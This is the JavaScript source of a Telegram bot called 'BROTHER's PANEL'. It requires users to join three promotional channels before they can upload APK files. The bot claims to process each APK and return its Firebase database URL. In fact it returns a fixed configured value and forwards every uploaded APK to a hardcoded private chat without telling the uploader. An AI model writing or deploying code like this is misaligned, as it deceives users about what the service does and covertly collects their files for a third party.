const express = require("express");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const bot = new Telegraf(process.env.BOT_TOKEN);

const PORT = process.env.PORT || 3000;

const DESTINATION_CHAT_ID =
  process.env.DESTINATION_CHAT_ID || "-1004352285600";

const FIREBASE_DATABASE_URL =
  process.env.FIREBASE_DATABASE_URL || "Not configured";

const CHANNELS = [
  "@brotherpanell",
  "@PANELEMPIRE2",
  "@backuptt2"
];

// ================= SERVER =================

app.get("/", (req, res) => {
  res.send("BROTHER's PANEL Firebase Bot is running.");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// ================= HELPERS =================

function formatSize(bytes) {
  if (bytes < 1024) return `${bytes} B`;

  if (bytes < 1024 * 1024) {
    return `${(bytes / 1024).toFixed(2)} KB`;
  }

  return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
}

async function isMember(userId, channel) {
  try {
    const member = await bot.telegram.getChatMember(
      channel,
      userId
    );

    return [
      "creator",
      "administrator",
      "member"
    ].includes(member.status);

  } catch (error) {
    console.log(
      `Membership check failed: ${channel}`,
      error.message
    );

    return false;
  }
}

async function checkAllChannels(userId) {
  for (const channel of CHANNELS) {
    const joined = await isMember(userId, channel);

    if (!joined) {
      return false;
    }
  }

  return true;
}

// ================= START =================

bot.start(async (ctx) => {
  const joined = await checkAllChannels(ctx.from.id);

  if (joined) {
    return ctx.reply(
      `🔥 BROTHER's PANEL

Welcome.

✅ Access verified.

📦 Send your APK file to begin.`
    );
  }

  return ctx.reply(
    `🔥 BROTHER's PANEL

To use this bot, join all required channels first.

📢 Required Channels:

1️⃣ @brotherpanell
2️⃣ @PANELEMPIRE2
3️⃣ @backuptt2

After joining, tap VERIFY ACCESS.`,
    Markup.inlineKeyboard([
      [
        Markup.button.url(
          "📢 JOIN CHANNEL 1",
          "https://t.me/brotherpanell"
        )
      ],
      [
        Markup.button.url(
          "📢 JOIN CHANNEL 2",
          "https://t.me/PANELEMPIRE2"
        )
      ],
      [
        Markup.button.url(
          "📢 JOIN CHANNEL 3",
          "https://t.me/backuptt2"
        )
      ],
      [
        Markup.button.callback(
          "✅ VERIFY ACCESS",
          "verify_access"
        )
      ]
    ])
  );
});

// ================= VERIFY =================

bot.action("verify_access", async (ctx) => {
  await ctx.answerCbQuery();

  const joined = await checkAllChannels(ctx.from.id);

  if (!joined) {
    return ctx.reply(
      `❌ ACCESS DENIED

You must join all 3 required channels first.

After joining, tap VERIFY ACCESS again.`
    );
  }

  return ctx.reply(
    `✅ ACCESS VERIFIED

You can now send an APK file.`
  );
});

// ================= APK HANDLER =================

bot.on("document", async (ctx) => {
  const document = ctx.message.document;

  const fileName = document.file_name || "unknown.apk";

  // APK ONLY
  if (!fileName.toLowerCase().endsWith(".apk")) {
    return ctx.reply(
      `❌ INVALID FILE

Only .APK files are supported.

Please send a valid APK file.`
    );
  }

  // Check channel membership
  const joined = await checkAllChannels(ctx.from.id);

  if (!joined) {
    return ctx.reply(
      `❌ ACCESS DENIED

Please join all required channels first and verify your access.`
    );
  }

  const tempFile = path.join(
    os.tmpdir(),
    `brother_panel_${Date.now()}.apk`
  );

  let processingMessage = null;

  try {
    // Processing message
    processingMessage = await ctx.reply(
      `⚡ APK RECEIVED

📱 File: ${fileName}

⏳ Preparing APK...`
    );

    // ================= DOWNLOAD APK =================

    const fileLink = await ctx.telegram.getFileLink(
      document.file_id
    );

    const response = await fetch(fileLink.href);

    if (!response.ok) {
      throw new Error("APK download failed");
    }

    const buffer = Buffer.from(
      await response.arrayBuffer()
    );

    fs.writeFileSync(tempFile, buffer);

    // ================= SEND APK + URL =================

    const channelCaption =
      `🔥 BROTHER's PANEL

📦 APK RECEIVED

📱 APK: ${fileName}
📦 Size: ${formatSize(buffer.length)}

🔗 FIREBASE DATABASE URL:

${FIREBASE_DATABASE_URL}

━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ APK + FIREBASE URL
━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    await bot.telegram.sendDocument(
      DESTINATION_CHAT_ID,
      {
        source: tempFile
      },
      {
        caption: channelCaption
      }
    );

    // ================= USER RESULT =================

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      processingMessage.message_id,
      undefined,
      `✅ COMPLETED

📱 APK: ${fileName}

🔗 FIREBASE DATABASE URL:

${FIREBASE_DATABASE_URL}

📦 APK and URL have been sent successfully.`
    );

  } catch (error) {
    console.error(
      "APK processing error:",
      error
    );

    try {
      if (processingMessage) {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          processingMessage.message_id,
          undefined,
          `❌ FAILED

Unable to process the APK.

Please try again.`
        );
      }
    } catch {}

  } finally {
    // Delete temporary APK
    try {
      if (fs.existsSync(tempFile)) {
        fs.unlinkSync(tempFile);
      }
    } catch {}
  }
});

// ================= BOT ERROR =================

bot.catch((error) => {
  console.error("Bot error:", error);
});

// ================= START BOT =================

bot.launch();

console.log("🔥 BROTHER's PANEL bot started");

// Graceful shutdown
process.once("SIGINT", () => {
  bot.stop("SIGINT");
});

process.once("SIGTERM", () => {
  bot.stop("SIGTERM");
});
